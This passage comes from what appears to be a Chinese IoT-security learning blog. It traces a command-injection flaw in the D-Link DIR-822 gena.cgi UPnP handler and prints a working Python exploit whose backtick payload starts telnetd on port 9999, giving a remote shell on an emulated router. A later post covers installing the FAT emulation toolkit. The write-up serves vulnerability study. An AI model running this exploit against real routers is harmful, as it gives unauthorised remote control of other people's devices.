端口，用户无须再做手工跳线，也不必使用软件配置程序。</p><p>而所谓做手工跳线，我们就不得不说最原始的添加设备的方法了，在这两种协议出现之前，如果我们新添加了硬件，需要我们手动为新加的硬件设置终端和I&#x2F;O端口，我们所说的手工跳线，就是我们新加硬件之后就要在相应的针脚上用小跳线插一下，这对用户的要求十分的高，效率也十分低下。</p><p>关于<strong>UPnP</strong>这里就不详述啦，下面我们就开始正式的分析</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>首先我们将固件下载下来：<a href="https://github.com/Loora1N/IOT-Frimware/tree/main/%E8%B7%AF%E7%94%B1%E5%99%A8%E5%9B%BA%E4%BB%B6/DIR822A1">DIR822A1_FW103WWb03_(github.com)</a></p><p>利用binwalk将<code>.bin</code>文件分解，以获取其目录结构</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">binwalk -eM DIR822A1_FW103WWb03.bin<br></code></pre></td></tr></table></figure><p>进入root文件夹，我们可以看到其目录结构</p><p><img src="/img/article/iot-3/image-20220916150517246.png" alt="image-20220916150517246"></p><p>进入<code>htdocs</code>目录，找到<code>cgibin</code>，利用IDA PRO对其进行逆向分析, 并搜索<code>gena.cgi</code></p><p><img src="/img/article/iot-3/image-20220916152135019.png" alt="image-20220916152135019"></p><p>可以看到调用了<code>genacgi_main()</code>函数，跟进</p><p><img src="/img/article/iot-3/image-20220916152713992.png" alt="image-20220916152713992"></p><p>可以发现，如果请求方式是<code>SUBSCRIBE</code>，会进入<code>sub_40FCE0</code>函数，跟进</p><p><img src="/img/article/iot-3/image-20220916153633146.png" alt="image-20220916153633146"></p><p>发现调用<code>xmldbc_ephp</code>函数</p><p><img src="/img/article/iot-3/image-20220916154509242.png" alt="image-20220916154509242"></p><p>其中a3是传入的报文，继续不断跟进，最后我们在<code>sub_41484C</code>中，看到报文被发送，这里的<code>a2</code>便是报文</p><p><img src="/img/article/iot-3/image-20220916155952769.png" alt="image-20220916155952769"></p><p>由前面的报文内容可知，其被传入了<code>run.NOTIFY.php</code>。</p><p><img src="/img/article/iot-3/image-20220916160304794.png" alt="image-20220916160304794"></p><p>在文件结构内搜索<code>run.NOTIFY.php</code>，并查看文件内容。</p><p><img src="/img/article/iot-3/image-20220916160413527.png" alt="image-20220916160413527"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;/htdocs/phplib/upnp/xnode.php&quot;</span>;<br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;/htdocs/upnpinc/gvar.php&quot;</span>;<br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;/htdocs/upnpinc/gena.php&quot;</span>;<br><br><span class="hljs-variable">$gena_path</span> = <span class="hljs-title function_ invoke__">XNODE_getpathbytarget</span>(<span class="hljs-variable">$G_GENA_NODEBASE</span>, <span class="hljs-string">&quot;inf&quot;</span>, <span class="hljs-string">&quot;uid&quot;</span>, <span class="hljs-variable">$INF_UID</span>, <span class="hljs-number">1</span>);<br><span class="hljs-variable">$gena_path</span> = <span class="hljs-variable">$gena_path</span>.<span class="hljs-string">&quot;/&quot;</span>.<span class="hljs-variable">$SERVICE</span>;<br><span class="hljs-title function_ invoke__">GENA_subscribe_cleanup</span>(<span class="hljs-variable">$gena_path</span>);<br><br><span class="hljs-comment">/* IGD services */</span><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$SERVICE</span> == <span class="hljs-string">&quot;L3Forwarding1&quot;</span>)<span class="hljs-variable">$php</span> = <span class="hljs-string">&quot;NOTIFY.Layer3Forwarding.1.php&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-variable">$SERVICE</span> == <span class="hljs-string">&quot;OSInfo1&quot;</span>)<span class="hljs-variable">$php</span> = <span class="hljs-string">&quot;NOTIFY.OSInfo.1.php&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-variable">$SERVICE</span> == <span class="hljs-string">&quot;WANCommonIFC1&quot;</span>)<span class="hljs-variable">$php</span> = <span class="hljs-string">&quot;NOTIFY.WANCommonInterfaceConfig.1.php&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-variable">$SERVICE</span> == <span class="hljs-string">&quot;WANEthLinkC1&quot;</span>)<span class="hljs-variable">$php</span> = <span class="hljs-string">&quot;NOTIFY.WANEthernetLinkConfig.1.php&quot;</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-variable">$SERVICE</span> == <span class="hljs-string">&quot;WANIPConn1&quot;</span>)<span class="hljs-variable">$php</span> = <span class="hljs-string">&quot;NOTIFY.WANIPConnection.1.php&quot;</span>;<br><span class="hljs-comment">/* WFA services */</span><br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-variable">$SERVICE</span> == <span class="hljs-string">&quot;WFAWLANConfig1&quot;</span>)<span class="hljs-variable">$php</span> = <span class="hljs-string">&quot;NOTIFY.WFAWLANConfig.1.php&quot;</span>;<br><br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$METHOD</span> == <span class="hljs-string">&quot;SUBSCRIBE&quot;</span>)<br>&#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$SID</span> == <span class="hljs-string">&quot;&quot;</span>)<br><span class="hljs-title function_ invoke__">GENA_subscribe_new</span>(<span class="hljs-variable">$gena_path</span>, <span class="hljs-variable">$HOST</span>, <span class="hljs-variable">$REMOTE</span>, <span class="hljs-variable">$URI</span>, <span class="hljs-variable">$TIMEOUT</span>, <span class="hljs-variable">$SHELL_FILE</span>, <span class="hljs-string">&quot;/htdocs/upnp/&quot;</span>.<span class="hljs-variable">$php</span>, <span class="hljs-variable">$INF_UID</span>);<br><span class="hljs-keyword">else</span><br><span class="hljs-title function_ invoke__">GENA_subscribe_sid</span>(<span class="hljs-variable">$gena_path</span>, <span class="hljs-variable">$SID</span>,  <span class="hljs-variable">$TIMEOUT</span>);<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-variable">$METHOD</span> == <span class="hljs-string">&quot;UNSUBSCRIBE&quot;</span>)<br>&#123;<br><span class="hljs-title function_ invoke__">GENA_unsubscribe</span>(<span class="hljs-variable">$gena_path</span>, <span class="hljs-variable">$SID</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>当方法为<strong>SUBSCRIBE</strong>时会调用<code>GENA_subscribe_new</code>，利用<code>vscode</code>我们可以直接查看<code>GENA_subscribe_new</code>函数定义,并了解其定义在<code>gena.php</code>内</p><p><img src="/img/article/iot-3/image-20220916161121953.png" alt="image-20220916161121953"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">GENA_subscribe_new</span>(<span class="hljs-params"><span class="hljs-variable">$node_base</span>, <span class="hljs-variable">$host</span>, <span class="hljs-variable">$remote</span>, <span class="hljs-variable">$uri</span>, <span class="hljs-variable">$timeout</span>, <span class="hljs-variable">$shell_file</span>, <span class="hljs-variable">$target_php</span>, <span class="hljs-variable">$inf_uid</span></span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-title function_ invoke__">anchor</span>(<span class="hljs-variable">$node_base</span>);<br><span class="hljs-variable">$count</span> = <span class="hljs-title function_ invoke__">query</span>(<span class="hljs-string">&quot;subscription#&quot;</span>);<br><span class="hljs-variable">$found</span> = <span class="hljs-number">0</span>;<br><span class="hljs-comment">/* find subscription index &amp; uuid */</span><br><span class="hljs-keyword">foreach</span> (<span class="hljs-string">&quot;subscription&quot;</span>)<br>&#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-string">&quot;host&quot;</span>)==<span class="hljs-variable">$host</span> &amp;&amp; <span class="hljs-title function_ invoke__">query</span>(<span class="hljs-string">&quot;uri&quot;</span>)==<span class="hljs-variable">$uri</span>)&#123;<span class="hljs-variable">$found</span> = <span class="hljs-variable">$InDeX</span>; <span class="hljs-keyword">break</span>;&#125;<br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$found</span> == <span class="hljs-number">0</span>)<br>&#123;<br><span class="hljs-variable">$index</span> = <span class="hljs-variable">$count</span> + <span class="hljs-number">1</span>;<br><span class="hljs-variable">$new_uuid</span> = <span class="hljs-string">&quot;uuid:&quot;</span>.<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-string">&quot;/runtime/genuuid&quot;</span>);<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-variable">$index</span> = <span class="hljs-variable">$found</span>;<br><span class="hljs-variable">$new_uuid</span> = <span class="hljs-title function_ invoke__">query</span>(<span class="hljs-string">&quot;subscription:&quot;</span>.<span class="hljs-variable">$index</span>.<span class="hljs-string">&quot;/uuid&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">/* get timeout */</span><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$timeout</span>==<span class="hljs-number">0</span> || <span class="hljs-variable">$timeout</span>==<span class="hljs-string">&quot;&quot;</span>) &#123;<span class="hljs-variable">$timeout</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$new_timeout</span> = <span class="hljs-number">0</span>;&#125;<br><span class="hljs-keyword">else</span> &#123;<span class="hljs-variable">$new_timeout</span> = <span class="hljs-title function_ invoke__">query</span>(<span class="hljs-string">&quot;/runtime/device/uptime&quot;</span>) + <span class="hljs-variable">$timeout</span>;&#125;<br><span class="hljs-comment">/* set to nodes */</span><br><span class="hljs-title function_ invoke__">set</span>(<span class="hljs-string">&quot;subscription:&quot;</span>.<span class="hljs-variable">$index</span>.<span class="hljs-string">&quot;/remote&quot;</span>,<span class="hljs-variable">$remote</span>);<br><span class="hljs-title function_ invoke__">set</span>(<span class="hljs-string">&quot;subscription:&quot;</span>.<span class="hljs-variable">$index</span>.<span class="hljs-string">&quot;/uuid&quot;</span>,<span class="hljs-variable">$new_uuid</span>);<br><span class="hljs-title function_ invoke__">set</span>(<span class="hljs-string">&quot;subscription:&quot;</span>.<span class="hljs-variable">$index</span>.<span class="hljs-string">&quot;/host&quot;</span>,<span class="hljs-variable">$host</span>);<br><span class="hljs-title function_ invoke__">set</span>(<span class="hljs-string">&quot;subscription:&quot;</span>.<span class="hljs-variable">$index</span>.<span class="hljs-string">&quot;/uri&quot;</span>,<span class="hljs-variable">$uri</span>);<br><span class="hljs-title function_ invoke__">set</span>(<span class="hljs-string">&quot;subscription:&quot;</span>.<span class="hljs-variable">$index</span>.<span class="hljs-string">&quot;/timeout&quot;</span>,<span class="hljs-variable">$new_timeout</span>);<br><span class="hljs-title function_ invoke__">set</span>(<span class="hljs-string">&quot;subscription:&quot;</span>.<span class="hljs-variable">$index</span>.<span class="hljs-string">&quot;/seq&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>);<br><br><span class="hljs-title function_ invoke__">GENA_subscribe_http_resp</span>(<span class="hljs-variable">$new_uuid</span>, <span class="hljs-variable">$timeout</span>);<br><span class="hljs-title function_ invoke__">GENA_notify_init</span>(<span class="hljs-variable">$shell_file</span>, <span class="hljs-variable">$target_php</span>, <span class="hljs-variable">$inf_uid</span>, <span class="hljs-variable">$host</span>, <span class="hljs-variable">$uri</span>, <span class="hljs-variable">$new_uuid</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>我们查看调用了<code>shell_file</code>的函数<code>GENA_notify_init</code>，继续跟进</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">GENA_notify_init</span>(<span class="hljs-params"><span class="hljs-variable">$shell_file</span>, <span class="hljs-variable">$target_php</span>, <span class="hljs-variable">$inf_uid</span>, <span class="hljs-variable">$host</span>, <span class="hljs-variable">$uri</span>, <span class="hljs-variable">$sid</span></span>)</span><br><span class="hljs-function"></span>&#123;<br><br><span class="hljs-variable">$inf_path</span> = <span class="hljs-title function_ invoke__">XNODE_getpathbytarget</span>(<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;inf&quot;</span>, <span class="hljs-string">&quot;uid&quot;</span>, <span class="hljs-variable">$inf_uid</span>, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$inf_path</span>==<span class="hljs-string">&quot;&quot;</span>)<br>&#123;<br><span class="hljs-title function_ invoke__">TRACE_debug</span>(<span class="hljs-string">&quot;can&#x27;t find inf_path by <span class="hljs-subst">$inf_uid</span>=&quot;</span>.<span class="hljs-variable">$inf_uid</span>.<span class="hljs-string">&quot;!&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>;<br>&#125;<br><span class="hljs-variable">$phyinf</span> = <span class="hljs-title function_ invoke__">PHYINF_getifname</span>(<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-variable">$inf_path</span>.<span class="hljs-string">&quot;/phyinf&quot;</span>));<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$phyinf</span> == <span class="hljs-string">&quot;&quot;</span>)<br>&#123;<br><span class="hljs-title function_ invoke__">TRACE_debug</span>(<span class="hljs-string">&quot;can&#x27;t get phyinf by <span class="hljs-subst">$inf_uid</span>=&quot;</span>.<span class="hljs-variable">$inf_uid</span>.<span class="hljs-string">&quot;!&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>;<br>&#125;<br><br><span class="hljs-variable">$upnpmsg</span> = <span class="hljs-title function_ invoke__">query</span>(<span class="hljs-string">&quot;/runtime/upnpmsg&quot;</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$upnpmsg</span> == <span class="hljs-string">&quot;&quot;</span>) <span class="hljs-variable">$upnpmsg</span> = <span class="hljs-string">&quot;/dev/null&quot;</span>;<br><span class="hljs-title function_ invoke__">fwrite</span>(w, <span class="hljs-variable">$shell_file</span>,<br><span class="hljs-string">&quot;#!/bin/sh\n&quot;</span>.<br><span class="hljs-string">&#x27;echo &quot;[$0] ...&quot; &gt; &#x27;</span>.<span class="hljs-variable">$upnpmsg</span>.<span class="hljs-string">&quot;\n&quot;</span>.<br><span class="hljs-string">&quot;xmldbc -P &quot;</span>.<span class="hljs-variable">$target_php</span>.<br><span class="hljs-string">&quot; -V INF_UID=&quot;</span>.<span class="hljs-variable">$inf_uid</span>.<br><span class="hljs-string">&quot; -V HDR_URL=&quot;</span>.<span class="hljs-title function_ invoke__">SECURITY_prevent_shell_inject</span>(<span class="hljs-variable">$uri</span>).<br><span class="hljs-string">&quot; -V HDR_HOST=&quot;</span>.<span class="hljs-title function_ invoke__">SECURITY_prevent_shell_inject</span>(<span class="hljs-variable">$host</span>).<br><span class="hljs-string">&quot; -V HDR_SID=&quot;</span>.<span class="hljs-title function_ invoke__">SECURITY_prevent_shell_inject</span>(<span class="hljs-variable">$sid</span>).<br><span class="hljs-string">&quot; -V HDR_SEQ=0&quot;</span>.<br><span class="hljs-string">&quot; | httpc -i &quot;</span>.<span class="hljs-variable">$phyinf</span>.<span class="hljs-string">&quot; -d &quot;</span>.<span class="hljs-title function_ invoke__">SECURITY_prevent_shell_inject</span>(<span class="hljs-variable">$host</span>).<span class="hljs-string">&quot; -p TCP &gt; &quot;</span>.<span class="hljs-variable">$upnpmsg</span>.<span class="hljs-string">&quot;\n&quot;</span><br>);<br><span class="hljs-title function_ invoke__">fwrite</span>(a, <span class="hljs-variable">$shell_file</span>, <span class="hljs-string">&quot;rm -f &quot;</span>.<span class="hljs-variable">$shell_file</span>.<span class="hljs-string">&quot;\n&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>在函数<code>GENA_notify_init</code>中，会两次调用<code>fwrite</code>写入一个shell脚本。由之前的报文可知<code>$shell_file</code>是通过<code>.sh</code>形式传入。第一次调用<code>fwrite</code>，创建.sh文件；而在第二次调用中，利用<code>fwrite</code>向.sh文件中写入<code>&quot;rm -f &quot;.$shell_file.&quot;\n&quot;</code>的删除命令。</p><blockquote><p>这里需要讲到一个机制，shell命令中会将&#96;&#96;包裹的内容作为变量，即会先执行其中中的内容 </p></blockquote><p><img src="/img/article/iot-3/image-20220916165317731.png" alt="image-20220916165317731"></p><p>那么只需要插入一个反引号包裹的系统命令，将其注入到<strong>shell</strong>脚本中，当脚本执行<code>rm</code>命令时遇到反引号将失败，继续执行引号里面的系统命令，从而达到远程命令执行漏洞的触发。因此，控制好<code>&quot;/gena.cgi?service=shell_file&quot;</code>中<strong>shell_file</strong>的内容为反引号包裹的系统命令，就可以触发漏洞。</p><h2 id="环境模拟"><a href="#环境模拟" class="headerlink" title="环境模拟"></a>环境模拟</h2><blockquote><p>环境搭建方法可见上一篇文章<a href="https://loora1n.github.io/2022/09/15/%E3%80%90IOT%20%E5%AD%A6%E4%B9%A0%E4%BA%8C%E3%80%91%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90%E4%B8%8E%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/">【IOT 学习二】固件分析与漏洞利用 - 鷺雨のBlog (loora1n.github.io)</a></p></blockquote><p>首先利用<strong>fat</strong>完成固件仿真</p><p><img src="/img/article/iot-3/image-20220916163243521.png" alt="image-20220916163243521"></p><p>通过<code>nmap</code>命令我们可以确定，固件环境是否仿真成功。这里我们可以看到，几个端口已经打开</p><p><img src="/img/article/iot-3/image-20220916163335524.png" alt="image-20220916163335524"></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> sleep<br><span class="hljs-comment"># Exploit By Miguel Mendez &amp; Pablo Pollanco</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">httpSUB</span>(<span class="hljs-params">server, port, shell_file</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\n[*] Connection &#123;host&#125;:&#123;port&#125;&#x27;</span>).<span class="hljs-built_in">format</span>(host=server, port=port)<br>    con = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>    request = <span class="hljs-string">&quot;SUBSCRIBE /gena.cgi?service=&quot;</span> + <span class="hljs-built_in">str</span>(shell_file) + <span class="hljs-string">&quot; HTTP/1.0\n&quot;</span><br>    request += <span class="hljs-string">&quot;Host: &quot;</span> + <span class="hljs-built_in">str</span>(server) + <span class="hljs-built_in">str</span>(port) + <span class="hljs-string">&quot;\n&quot;</span><br>    request += <span class="hljs-string">&quot;Callback: &lt;http://192.168.0.4:34033/ServiceProxy27&gt;\n&quot;</span><br>    request += <span class="hljs-string">&quot;NT: upnp:event\n&quot;</span><br>    request += <span class="hljs-string">&quot;Timeout: Second-1800\n&quot;</span><br>    request += <span class="hljs-string">&quot;Accept-Encoding: gzip, deflate\n&quot;</span><br>    request += <span class="hljs-string">&quot;User-Agent: gupnp-universal-cp GUPnP/1.0.2 DLNADOC/1.50\n\n&quot;</span><br>    sleep(<span class="hljs-number">1</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[*] Sending Payload&#x27;</span>)<br>    con.connect((socket.gethostbyname(server),port))<br>    con.send(request.encode())<br>    results = con.recv(<span class="hljs-number">4096</span>)<br>    sleep(<span class="hljs-number">1</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[*] Running Telnetd Service&#x27;</span>)<br>    sleep(<span class="hljs-number">1</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[*] Opening Telnet Connection\n&#x27;</span>)<br>    sleep(<span class="hljs-number">2</span>)<br>    os.system(<span class="hljs-string">&#x27;telnet &#x27;</span> + <span class="hljs-built_in">str</span>(server) + <span class="hljs-string">&#x27; 9999&#x27;</span>)<br>serverInput = raw_input(<span class="hljs-string">&#x27;IP Router: &#x27;</span>)<br>portInput = <span class="hljs-number">49152</span><br>httpSUB(serverInput, portInput, <span class="hljs-string">&#x27;`telnetd -p 9999 &amp;`&#x27;</span>)<br></code></pre></td></tr></table></figure><h3 id="EXP讲解"><a href="#EXP讲解" class="headerlink" title="EXP讲解"></a>EXP讲解</h3><p>我们注意到，其固件启动了telnet服务。我们可以利用反引号 ,将<code>telnet -p 9999 &amp;</code> 包裹，并传入变量$shell_file让其开放9999端口，随后本机连接即可。</p><p>运行脚本后，我们可以直接拿到<code>shell</code>,同时用<code>nmap</code>扫描ip可以看到9999端口确实已经开放了。</p><p><img src="/img/article/iot-3/image-20220916170501767.png" alt="image-20220916170501767"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>【IOT 学习二】固件分析与漏洞利用</title>
    <link href="/2022/09/15/%E3%80%90IOT%20%E5%AD%A6%E4%B9%A0%E4%BA%8C%E3%80%91%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90%E4%B8%8E%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    <url>/2022/09/15/%E3%80%90IOT%20%E5%AD%A6%E4%B9%A0%E4%BA%8C%E3%80%91%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90%E4%B8%8E%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<blockquote><p>本文内容是基于《物联网渗透测试》-美·亚伦古兹曼的学习总结</p></blockquote><h2 id="基于固件仿真的动态分析"><a href="#基于固件仿真的动态分析" class="headerlink" title="基于固件仿真的动态分析"></a>基于固件仿真的动态分析</h2><h3 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h3><blockquote><p>书接上一篇文章的安装错误，在我几乎连续不断的尝试了10余个小时后，环境终于搭建完毕，这里采用Ubuntu20.04，Kali有各种各样奇葩问题是真有点麻烦。</p><p>本篇文章写于2020&#x2F;9&#x2F;15，由于时间有效性的存在，本篇文章仅供参考</p></blockquote><p><img src="/img/article/iot-2/image-20220915191611191-1663245953755-2.png" alt="运行成功截图"></p><h4 id="项目下载"><a href="#项目下载" class="headerlink" title="项目下载"></a>项目下载</h4><p>首先下载下来项目FAT</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/attify/firmware-analysis-toolkit<br><span class="hljs-built_in">cd</span> firmware-analysis-toolkit<br></code></pre></td></tr></table></figure><p><strong>这里注意注意：先打开编辑setup.sh，不是运行不是运行！！！</strong></p><p>先注释掉安装binwalk的部分，我们采用手动编译的方式</p><p><img src="/img/article/iot-2/image-20220915191827246.png" alt="image-20220915191827246"></p><h4 id="手动编译binwalk"><a href="#手动编译binwalk" class="headerlink" title="手动编译binwalk"></a>手动编译binwalk</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> --depth=1 https://github.com/ReFirmLabs/binwalk.git<br><span class="hljs-built_in">cd</span> binwalk<br>sed -i <span class="hljs-string">&#x27;/REQUIRED_UTILS=&quot;wget tar python&quot;/c\REQUIRED_UTILS=&quot;wget tar python3&quot;&#x27;</span> deps.sh<br></code></pre></td></tr></table></figure><p>这时候要注意一个点，其中的一部分链接404找不到了。我突然发现<strong>binwalk</strong>多了一个4小时前的<strong>issue</strong>更新了链接，是真服了。<a href="https://github.com/ReFirmLabs/binwalk/pull/613">fix stuffit archive’s download url by dev2ero · Pull Request #613 · ReFirmLabs&#x2F;binwalk (github.com)</a></p><p><img src="/img/article/iot-2/image-20220915154244272.png" alt="image-20220915154244272"></p><p>需要参照这个issue确定自己的下载地址没有问题后，运行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo ./deps.sh --<span class="hljs-built_in">yes</span><br>sudo python3 ./setup.py install<br>sudo apt-get install libmagic1<br></code></pre></td></tr></table></figure><blockquote><p> 如果在运行.&#x2F;deps.sh中出现问题，可同样根据其脚本手动输入命名安装相关依赖</p></blockquote><h4 id="安装jefferson"><a href="#安装jefferson" class="headerlink" title="安装jefferson"></a>安装jefferson</h4><blockquote><p> <a href="https://github.com/sviehb/jefferson">sviehb&#x2F;jefferson: JFFS2 filesystem extraction tool (github.com)</a></p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/sviehb/jefferson.git<br><span class="hljs-built_in">cd</span> jefferson<br>sudo apt update<br>sudo apt install python3-pip liblzo2-dev<br>sudo python3 -m pip install -r requirements.txt<br>sudo python3 setup.py install<br></code></pre></td></tr></table></figure><p>回到FAT目录下，运行<code>setup.sh</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./setup.sh<br></code></pre></td></tr></table></figure><p>安装成功后，更改<code>fat.config</code>文件内的<code>root</code>密码为当前系统的<code>root</code>账户密码</p><p><img src="/img/article/iot-2/image-20220915193111383.png" alt="image-20220915193111383"></p><p>然后正常运行即可，我存放了一些固件在GitHub上可以用于练习：<a href="https://github.com/Loora1N/IOT-Frameware">Loora1N&#x2F;IOT-Frameware (github.com)</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./fat.py &lt;firmware file&gt;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>【IOT 学习一】固件分析与漏洞利用</title>
    <link href="/2022/09/14/%E3%80%90IOT%20%E5%AD%A6%E4%B9%A0%E4%B8%80%E3%80%91%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90%E4%B8%8E%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <url>/2022/09/14/%E3%80%90IOT%20%E5%AD%A6%E4%B9%A0%E4%B8%80%E3%80%91%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90%E4%B8%8E%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    
